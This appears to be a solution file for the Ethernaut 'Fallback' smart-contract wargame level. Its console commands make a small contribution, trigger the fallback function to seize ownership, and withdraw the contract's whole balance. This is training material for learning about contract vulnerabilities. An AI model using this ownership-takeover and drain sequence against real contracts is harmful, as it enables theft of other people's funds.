// Type those commands on ethernaut terminal

/**
 * Initial owner address: 0x234094aac85628444a82dae0396c680974260be7
 * Player address: 0x300ba264268b13f3dbadb27426632508bcad2a2d
 */


contract.owner()
// ^ returns promise with address of current owner
// returns: 0x234094aac85628444a82dae0396c680974260be7

contract.contribute({value: toWei(0.001)/2})
// ^ make a contribution less than 0.001 ether to increase contibutions

contract.sendTransaction({value:1})
// ^ send empty transaction to execute fallback method
// msg.value must be > 0, here is 1 wei

contract.withdraw()
// ^ reduce balance to 0

contract.owner()
// ^ returns promise with address of new owner
// returns: 0x300ba264268b13f3dbadb27426632508bcad2a2d

